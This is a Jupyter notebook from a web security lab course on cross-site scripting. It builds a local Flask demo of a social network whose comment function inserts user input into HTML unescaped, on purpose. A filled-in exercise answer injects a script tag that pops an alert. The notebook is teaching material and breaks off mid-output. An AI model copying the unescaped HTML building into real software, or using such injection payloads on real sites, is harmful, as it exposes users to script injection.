{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Web Security Lab\n",
    "\n",
    "v1.0 (2020 Summer): Nicholas Ngai\n",
    "\n",
    "v2.0 (2021 Fall): Yuncong Hu"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Section 1: A Simple Cross-Site Scripting (XSS) Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this section, we will learn how a cross-site scripting attack (XSS) works. In particular, we will see a variety of attack scripts and learn how to defend against them. XSS attack is a powerful attack that can subvert the same-origin policy. To do so, the attacker injects malicious JavaScript onto a webpage. When the victim loads the webpage, the user’s browser will run the malicious JavaScript automatically.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Setup\n",
    "To begin with, we show how to run the website in Python. This lab requires the Flask package, a Python framework for building web servers. Run the following block to install this package."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting flask\n",
      "  Using cached Flask-2.0.2-py3-none-any.whl (95 kB)\n",
      "Requirement already satisfied: Jinja2>=3.0 in /Library/Frameworks/Python.framework/Versions/3.9/lib/python3.9/site-packages (from flask) (3.0.1)\n",
      "Collecting Werkzeug>=2.0\n",
      "  Using cached Werkzeug-2.0.2-py3-none-any.whl (288 kB)\n",
      "Requirement already satisfied: click>=7.1.2 in /Library/Frameworks/Python.framework/Versions/3.9/lib/python3.9/site-packages (from flask) (8.0.1)\n",
      "Collecting itsdangerous>=2.0\n",
      "  Using cached itsdangerous-2.0.1-py3-none-any.whl (18 kB)\n",
      "Requirement already satisfied: MarkupSafe>=2.0 in /Library/Frameworks/Python.framework/Versions/3.9/lib/python3.9/site-packages (from Jinja2>=3.0->flask) (2.0.1)\n",
      "Installing collected packages: Werkzeug, itsdangerous, flask\n",
      "  Attempting uninstall: Werkzeug\n",
      "    Found existing installation: Werkzeug 1.0.1\n",
      "    Uninstalling Werkzeug-1.0.1:\n",
      "      Successfully uninstalled Werkzeug-1.0.1\n",
      "Successfully installed Werkzeug-2.0.2 flask-2.0.2 itsdangerous-2.0.1\n",
      "\u001b[33mWARNING: You are using pip version 21.0.1; however, version 21.3.1 is available.\n",
      "You should consider upgrading via the '/Library/Frameworks/Python.framework/Versions/3.9/bin/python3.9 -m pip install --upgrade pip' command.\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!pip3 install flask"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Run the following code to import the package."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import logging\n",
    "from flask import Flask, request\n",
    "from multiprocessing import Process\n",
    "\n",
    "log = logging.getLogger('werkzeug')\n",
    "log.setLevel(logging.ERROR)\n",
    "\n",
    "p = None"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Below we provide a template website that simulates a simple social networking site."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "web_template = \"\"\"\n",
    "<html>\n",
    "    <head>\n",
    "            <style type=\"text/css\">\n",
    "            body{margin-top:20px;}\n",
    "\n",
    "            /*==================================================\n",
    "              Post Contents CSS\n",
    "              ==================================================*/\n",
    "\n",
    "            .post-content{\n",
    "              background: #f8f8f8;\n",
    "              border-radius: 4px;\n",
    "              width: 100%;\n",
    "              border: 1px solid #f1f2f2;\n",
    "              margin-bottom: 20px;\n",
    "              overflow: hidden;\n",
    "              position: relative;\n",
    "            }\n",
    "\n",
    "            .post-content img.post-image, video.post-video, .google-maps{\n",
    "              width: 100%;\n",
    "              height: auto;\n",
    "            }\n",
    "\n",
    "            .post-content .google-maps .map{\n",
    "              height: 300px;\n",
    "            }\n",
    "\n",
    "            .post-content .post-container{\n",
    "              padding: 20px;\n",
    "            }\n",
    "\n",
    "            .post-content .post-container .post-detail{\n",
    "              margin-left: 65px;\n",
    "              position: relative;\n",
    "            }\n",
    "\n",
    "            .post-content .post-container .post-detail .post-text{\n",
    "              line-height: 24px;\n",
    "              margin: 0;\n",
    "            }\n",
    "\n",
    "            .post-content .post-container .post-detail .reaction{\n",
    "              position: absolute;\n",
    "              right: 0;\n",
    "              top: 0;\n",
    "            }\n",
    "\n",
    "            .post-content .post-container .post-detail .post-comment{\n",
    "              display: inline-flex;\n",
    "              margin: 10px auto;\n",
    "              width: 100%;\n",
    "            }\n",
    "\n",
    "            .post-content .post-container .post-detail .post-comment img.profile-photo-sm{\n",
    "              margin-right: 10px;\n",
    "            }\n",
    "\n",
    "            .post-content .post-container .post-detail .post-comment .form-control{\n",
    "              height: 30px;\n",
    "              border: 1px solid #ccc;\n",
    "              box-shadow: inset 0 1px 1px rgba(0,0,0,.075);\n",
    "              margin: 7px 0;\n",
    "              min-width: 0;\n",
    "            }\n",
    "\n",
    "            img.profile-photo-md {\n",
    "                height: 50px;\n",
    "                width: 50px;\n",
    "                border-radius: 50%;\n",
    "            }\n",
    "\n",
    "            img.profile-photo-sm {\n",
    "                height: 40px;\n",
    "                width: 40px;\n",
    "                border-radius: 50%;\n",
    "            }\n",
    "\n",
    "            .text-green {\n",
    "                color: #8dc63f;\n",
    "            }\n",
    "\n",
    "            .text-red {\n",
    "                color: #ef4136;\n",
    "            }\n",
    "\n",
    "            .following {\n",
    "                color: #8dc63f;\n",
    "                font-size: 12px;\n",
    "                margin-left: 20px;\n",
    "            }\n",
    "        </style>\n",
    "    </head>\n",
    "    <body>\n",
    "        <div class=\"container\">\n",
    "            <div class=\"row\">\n",
    "                <div class=\"col-md-8\">\n",
    "                    <div class=\"post-content\">\n",
    "                      <div class=\"post-container\">\n",
    "                        <img src=\"https://bootdey.com/img/Content/avatar/avatar6.png\" alt=\"user\" class=\"profile-photo-md pull-left\">\n",
    "                        <div class=\"post-detail\">\n",
    "                          <div class=\"user-info\">\n",
    "                            <h5><a href=\"timeline.html\" class=\"profile-link\">Alexis Clark</a> <span class=\"following\">following</span></h5>\n",
    "                            <p class=\"text-muted\">Published a photo about 3 mins ago</p>\n",
    "                          </div>\n",
    "                          <div class=\"reaction\">\n",
    "                            <a class=\"btn text-green\"><i class=\"fa fa-thumbs-up\"></i> 13</a>\n",
    "                            <a class=\"btn text-red\"><i class=\"fa fa-thumbs-down\"></i> 0</a>\n",
    "                          </div>\n",
    "                          <div class=\"line-divider\"></div>\n",
    "                          <div class=\"post-text\">\n",
    "                            <p> I got an A in CS161! <i class=\"em em-anguished\"></i> <i class=\"em em-anguished\"></i> <i class=\"em em-anguished\"></i></p>\n",
    "                          </div>\n",
    "                          <div class=\"line-divider\"></div>\n",
    "                          <div class=\"post-comment\">\n",
    "                            <img src=\"https://bootdey.com/img/Content/avatar/avatar7.png\" alt=\"\" class=\"profile-photo-sm\">\n",
    "                            <p><a href=\"timeline.html\" class=\"profile-link\">David </a><i class=\"em em-laughing\"></i> Congratulations! </p>\n",
    "                          </div>\n",
    "                          <div class=\"post-comment\">\n",
    "                            <img src=\"https://bootdey.com/img/Content/avatar/avatar1.png\" alt=\"\" class=\"profile-photo-sm\">\n",
    "                            <p><a href=\"timeline.html\" class=\"profile-link\">John</a> Congratulations! </p>\n",
    "                          </div>\n",
    "                          <div class=\"post-comment\">\n",
    "                            <img src=\"https://bootdey.com/img/Content/avatar/avatar1.png\" alt=\"\" class=\"profile-photo-sm\">\n",
    "                            <input type=\"text\" class=\"form-control\" placeholder=\"Post a comment\">\n",
    "                          </div>\n",
    "                        </div>\n",
    "                      </div>\n",
    "                    </div>\n",
    "                </div>\n",
    "            </div>\n",
    "        </div>\n",
    "    </body>\n",
    "</html>\n",
    "    \"\"\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Below is some code that will spawn an HTTP server on your local computer and dump the request data. Run the code block and navigate to (http://localhost:5000) in your browser of choice to see our website. Note that this is a static website, so you cannot interact with it directly."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "ename": "AttributeError",
     "evalue": "Can't pickle local object 'Flask.__init__.<locals>.<lambda>'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-4-cd0a275b22f8>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     20\u001b[0m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjoin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     21\u001b[0m \u001b[0mp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mProcess\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtarget\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mapp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 22\u001b[0;31m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstart\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/process.py\u001b[0m in \u001b[0;36mstart\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    119\u001b[0m                \u001b[0;34m'daemonic processes are not allowed to have children'\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    120\u001b[0m         \u001b[0m_cleanup\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 121\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_popen\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_Popen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    122\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_sentinel\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_popen\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msentinel\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    123\u001b[0m         \u001b[0;31m# Avoid a refcycle if the target function holds an indirect\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/context.py\u001b[0m in \u001b[0;36m_Popen\u001b[0;34m(process_obj)\u001b[0m\n\u001b[1;32m    222\u001b[0m     \u001b[0;34m@\u001b[0m\u001b[0mstaticmethod\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    223\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m_Popen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprocess_obj\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 224\u001b[0;31m         \u001b[0;32mreturn\u001b[0m \u001b[0m_default_context\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mget_context\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mProcess\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_Popen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprocess_obj\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    225\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    226\u001b[0m \u001b[0;32mclass\u001b[0m \u001b[0mDefaultContext\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mBaseContext\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/context.py\u001b[0m in \u001b[0;36m_Popen\u001b[0;34m(process_obj)\u001b[0m\n\u001b[1;32m    282\u001b[0m         \u001b[0;32mdef\u001b[0m \u001b[0m_Popen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprocess_obj\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    283\u001b[0m             \u001b[0;32mfrom\u001b[0m \u001b[0;34m.\u001b[0m\u001b[0mpopen_spawn_posix\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mPopen\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 284\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mPopen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprocess_obj\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    285\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    286\u001b[0m     \u001b[0;32mclass\u001b[0m \u001b[0mForkServerProcess\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprocess\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mBaseProcess\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/popen_spawn_posix.py\u001b[0m in \u001b[0;36m__init__\u001b[0;34m(self, process_obj)\u001b[0m\n\u001b[1;32m     30\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m__init__\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mprocess_obj\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     31\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_fds\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 32\u001b[0;31m         \u001b[0msuper\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m__init__\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprocess_obj\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     33\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     34\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mduplicate_for_child\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfd\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/popen_fork.py\u001b[0m in \u001b[0;36m__init__\u001b[0;34m(self, process_obj)\u001b[0m\n\u001b[1;32m     17\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     18\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfinalizer\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 19\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_launch\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprocess_obj\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     20\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     21\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mduplicate_for_child\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfd\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/popen_spawn_posix.py\u001b[0m in \u001b[0;36m_launch\u001b[0;34m(self, process_obj)\u001b[0m\n\u001b[1;32m     45\u001b[0m         \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     46\u001b[0m             \u001b[0mreduction\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdump\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprep_data\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfp\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 47\u001b[0;31m             \u001b[0mreduction\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdump\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprocess_obj\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfp\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     48\u001b[0m         \u001b[0;32mfinally\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     49\u001b[0m             \u001b[0mset_spawning_popen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;32mNone\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/reduction.py\u001b[0m in \u001b[0;36mdump\u001b[0;34m(obj, file, protocol)\u001b[0m\n\u001b[1;32m     58\u001b[0m \u001b[0;32mdef\u001b[0m \u001b[0mdump\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mobj\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfile\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mprotocol\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;32mNone\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     59\u001b[0m     \u001b[0;34m'''Replacement for pickle.dump() using ForkingPickler.'''\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 60\u001b[0;31m     \u001b[0mForkingPickler\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mfile\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mprotocol\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdump\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mobj\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     61\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     62\u001b[0m \u001b[0;31m#\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mAttributeError\u001b[0m: Can't pickle local object 'Flask.__init__.<locals>.<lambda>'"
     ]
    }
   ],
   "source": [
    "app = Flask('CS 161 Social Network Post Demo')\n",
    "web = web_template\n",
    "\n",
    "@app.route('/', defaults={'path': ''})\n",
    "@app.route('/<path:path>')\n",
    "def dump_response(path):\n",
    "    print(\"%s %s %s\\n%s\" % (\n",
    "        request.method,\n",
    "        request.environ['RAW_URI'],\n",
    "        request.environ['SERVER_PROTOCOL'],\n",
    "        request.headers\n",
    "    ), end='')\n",
    "    data = request.get_data()\n",
    "    if data:\n",
    "        print(\"%s\" % data.decode('utf-8'))\n",
    "    return web\n",
    "\n",
    "if p:\n",
    "    p.terminate()\n",
    "    p.join()\n",
    "p = Process(target=app.run)\n",
    "p.start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Below is a provided function to post comments in the above website."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "def post(comment):\n",
    "    (w1, w2, w3) = web.partition(\"<input type=\\\"text\\\" class=\\\"form-control\\\" placeholder=\\\"Post a comment\\\">\");\n",
    "    tmp = w1 + \"\\n<p><a href=\\\"timeline.html\\\" class=\\\"profile-link\\\">John</a> \" + comment + \" </p>\\n\" + \"\"\"\n",
    "    </div>\n",
    "    <div class=\"post-comment\">\n",
    "        <img src=\"https://bootdey.com/img/Content/avatar/avatar1.png\" alt=\"\" class=\"profile-photo-sm\">\n",
    "    \"\"\" + w2 + w3;\n",
    "    return tmp;"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Warmup\n",
    "1. Provide a comment below and see how it shows up on the website. Run the following two blocks and refresh the website (http://localhost:5000)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "comment = \"example comment\" # Your answer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "ename": "AttributeError",
     "evalue": "'NoneType' object has no attribute 'terminate'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-7-425d72237381>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      4\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;32mif\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 6\u001b[0;31m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      7\u001b[0m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjoin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      8\u001b[0m \u001b[0mp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mProcess\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtarget\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mapp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/Cellar/python@3.9/3.9.9/Frameworks/Python.framework/Versions/3.9/lib/python3.9/multiprocessing/process.py\u001b[0m in \u001b[0;36mterminate\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    131\u001b[0m         '''\n\u001b[1;32m    132\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_check_closed\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 133\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_popen\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    134\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    135\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mkill\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mAttributeError\u001b[0m: 'NoneType' object has no attribute 'terminate'"
     ]
    }
   ],
   "source": [
    "# Post your comment and refresh the website (http://localhost:5000).\n",
    "web = web_template;\n",
    "web = post(comment);\n",
    "\n",
    "if p:\n",
    "    p.terminate()\n",
    "    p.join()\n",
    "p = Process(target=app.run)\n",
    "p.start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2. Construct a malicious input to comment that will inject an Javascript script of your choice."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "comment = \"<script>alert(\\\"XSS attack!\\\")</script>\" # Your answer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "ename": "AttributeError",
     "evalue": "'NoneType' object has no attribute 'terminate'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-9-425d72237381>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      4\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;32mif\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 6\u001b[0;31m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterminate\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      7\u001b[0m     \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mjoin\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      8\u001b[0m \u001b[0mp\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mProcess\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtarget\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mapp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrun\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
